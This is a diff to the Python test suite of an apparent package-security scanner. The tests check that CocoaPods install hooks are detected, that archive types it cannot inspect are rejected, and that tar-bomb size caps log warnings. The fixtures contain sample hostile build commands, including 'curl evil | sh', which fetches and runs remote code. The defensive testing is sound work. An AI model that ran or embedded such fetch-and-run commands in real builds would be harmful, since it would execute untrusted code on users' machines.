@@ -193,6 +193,93 @@ class TestResolveCocoapods:
         with pytest.raises(ValueError, match="explicit version"):
             await _resolve_cocoapods("AFNetworking", None)
 
+    @pytest.mark.asyncio
+    async def test_resolve_top_level_prepare_command_flags_install_scripts(self, monkeypatch):
+        """US-008 / Reviewer merged_bug_001: prepare_command is a TOP-LEVEL
+        podspec attribute. Previously read from source.get('prepare_command')
+        which is always None for real podspecs → has_install_scripts always False."""
+        shard = _cocoapods_shard("Evil")
+        url = f"{COCOAPODS_CDN}/{shard}/Evil/1.0.0/Evil.podspec.json"
+        responses = {
+            url: _FakeResponse(
+                json_data={
+                    "name": "Evil",
+                    "version": "1.0.0",
+                    "summary": "x",
+                    "homepage": "https://example.com",
+                    "authors": {"a": "a@x"},
+                    "source": {
+                        "git": "https://github.com/x/y.git",
+                        "tag": "1.0.0",
+                    },
+                    # prepare_command at TOP LEVEL — runs before pod install
+                    "prepare_command": "echo pwned > /tmp/x",
+                }
+            )
+        }
+        monkeypatch.setattr(
+            "aigate.resolver.httpx.AsyncClient",
+            lambda **_: _FakeAsyncClient(responses),
+        )
+        pkg = await _resolve_cocoapods("Evil", "1.0.0")
+        assert pkg.has_install_scripts is True, (
+            "top-level prepare_command must flag has_install_scripts=True"
+        )
+
+    @pytest.mark.asyncio
+    async def test_resolve_top_level_script_phases_flags_install_scripts(self, monkeypatch):
+        """US-008: script_phases is the CocoaPods analog of npm postinstall —
+        runs arbitrary shell during Xcode build. Top-level attribute, must be
+        included in has_install_scripts detection."""
+        shard = _cocoapods_shard("WithScripts")
+        url = f"{COCOAPODS_CDN}/{shard}/WithScripts/1.0/WithScripts.podspec.json"
+        responses = {
+            url: _FakeResponse(
+                json_data={
+                    "name": "WithScripts",
+                    "version": "1.0",
+                    "summary": "x",
+                    "homepage": "https://example.com",
+                    "authors": {"a": "a@x"},
+                    "source": {"git": "https://github.com/x/y.git", "tag": "1.0"},
+                    "script_phases": [{"name": "evil", "script": "curl evil | sh"}],
+                }
+            )
+        }
+        monkeypatch.setattr(
+            "aigate.resolver.httpx.AsyncClient",
+            lambda **_: _FakeAsyncClient(responses),
+        )
+        pkg = await _resolve_cocoapods("WithScripts", "1.0")
+        assert pkg.has_install_scripts is True, (
+            "top-level script_phases must flag has_install_scripts=True"
+        )
+
+    @pytest.mark.asyncio
+    async def test_resolve_no_install_scripts_when_top_level_empty(self, monkeypatch):
+        """US-008 control: a clean podspec without prepare_command/script_phases
+        must not be flagged."""
+        shard = _cocoapods_shard("Clean")
+        url = f"{COCOAPODS_CDN}/{shard}/Clean/1.0/Clean.podspec.json"
+        responses = {
+            url: _FakeResponse(
+                json_data={
+                    "name": "Clean",
+                    "version": "1.0",
+                    "summary": "x",
+                    "homepage": "https://example.com",
+                    "authors": {"a": "a@x"},
+                    "source": {"git": "https://github.com/x/y.git", "tag": "1.0"},
+                }
+            )
+        }
+        monkeypatch.setattr(
+            "aigate.resolver.httpx.AsyncClient",
+            lambda **_: _FakeAsyncClient(responses),
+        )
+        pkg = await _resolve_cocoapods("Clean", "1.0")
+        assert pkg.has_install_scripts is False
+
 
 # ---------------------------------------------------------------------------
 # _download_cocoapods_source — http path
@@ -393,12 +480,11 @@ class TestDivergenceDetection:
             version="1.0",
             ecosystem="cocoapods",
             metadata={
-                "source": {
-                    "git": "https://github.com/owner/repo.git",
-                    "tag": "1.0",
-                    "source_files": "Classes/**/*.swift",
-                },
-                "podspec": {},
+                # source_files is a TOP-LEVEL podspec field per CocoaPods spec
+                # (US-008 / Reviewer merged_bug_001 — fixtures previously
+                # nested it inside `source` which mirrored the bug).
+                "source": {"git": "https://github.com/owner/repo.git", "tag": "1.0"},
+                "podspec": {"source_files": "Classes/**/*.swift"},
             },
         )
         files = await _download_cocoapods_source(pkg, github_token="t")
@@ -427,12 +513,9 @@ class TestDivergenceDetection:
             version="1.0",
             ecosystem="cocoapods",
             metadata={
-                "source": {
-                    "git": "https://github.com/owner/repo.git",
-                    "tag": "1.0",
-                    "source_files": "Classes/**/*.swift",
-                },
-                "podspec": {},
+                # source_files at top-level (US-008 fixture correction)
+                "source": {"git": "https://github.com/owner/repo.git", "tag": "1.0"},
+                "podspec": {"source_files": "Classes/**/*.swift"},
             },
         )
         files = await _download_cocoapods_source(pkg, github_token="t")
@@ -654,14 +737,15 @@ def test_list_tarball_members_caps_member_count(caplog):
     entries = [(f"pkg-1.0/file_{i:05d}.txt", b"hi") for i in range(_MAX_MANIFEST_MEMBERS + 500)]
     blob = _build_tarball(entries)
 
-    with caplog.at_level(logging.WARNING):
+    with caplog.at_level(logging.WARNING, logger="aigate.resolver"):
         manifest = _list_tarball_members(blob, "x.tar.gz")
 
     assert len(manifest) <= _MAX_MANIFEST_MEMBERS, (
         f"manifest size {len(manifest)} should not exceed cap {_MAX_MANIFEST_MEMBERS}"
     )
-    assert any("member cap" in rec.message for rec in caplog.records), (
-        "expected a tar-bomb member-cap warning"
+    messages = [rec.getMessage() for rec in caplog.records]
+    assert any("member cap" in m for m in messages), (
+        f"expected a tar-bomb member-cap warning, got messages: {messages[:3]}"
     )
 
 
@@ -677,16 +761,44 @@ def test_list_tarball_members_caps_cumulative_bytes(caplog):
     entries = [(f"pkg-1.0/big_{i:04d}.bin", chunk) for i in range(members)]
     blob = _build_tarball(entries)
 
-    with caplog.at_level(logging.WARNING):
+    with caplog.at_level(logging.WARNING, logger="aigate.resolver"):
         manifest = _list_tarball_members(blob, "x.tar.gz")
 
     total = sum(len(v) for v in manifest.values())
     assert total <= _MAX_MANIFEST_BYTES + 64 * 1024, (
         f"cumulative bytes {total} broke the {_MAX_MANIFEST_BYTES} cap"
     )
-    assert any("cumulative cap" in rec.message for rec in caplog.records), (
-        "expected a tar-bomb cumulative-byte-cap warning"
+    messages = [rec.getMessage() for rec in caplog.records]
+    assert any("cumulative cap" in m for m in messages), (
+        f"expected a tar-bomb cumulative-byte-cap warning, got messages: {messages[:3]}"
     )
+
+
+def test_cocoapods_http_unknown_archive_type_raises_source_unavailable():
+    """US-007 / Reviewer bug_023: source.type=tar/tbz/txz/tlz are valid podspec
+    types but _extract_archive only supports tar.gz/zip. Without this guard,
+    those types fell through silently to an empty source_files dict → SAFE on
+    uninspected bytes. Now raises SourceUnavailableError so cli routes to
+    NEEDS_HUMAN_REVIEW."""
+    import asyncio
+
+    from aigate.resolver import SourceUnavailableError, _download_cocoapods_http
+
+    class _FakeResp:
+        def __init__(self):
+            self.content = b"\x1f\x8b\x00\x00"  # any bytes; type-check fails first
+
+        def raise_for_status(self):
+            pass
+
+    class _FakeClient:
+        async def get(self, *a, **kw):
+            return _FakeResp()
+
+    for bad_type in ("tar", "tbz", "txz", "tlz", "tar.bz2", "weird"):
+        source = {"http": "https://example.com/pkg.tar", "type": bad_type}
+        with pytest.raises(SourceUnavailableError, match="unsupported archive type"):
+            asyncio.run(_download_cocoapods_http(source["http"], source, client=_FakeClient()))
 
 
 def test_list_tarball_members_normal_tarball_unaffected():
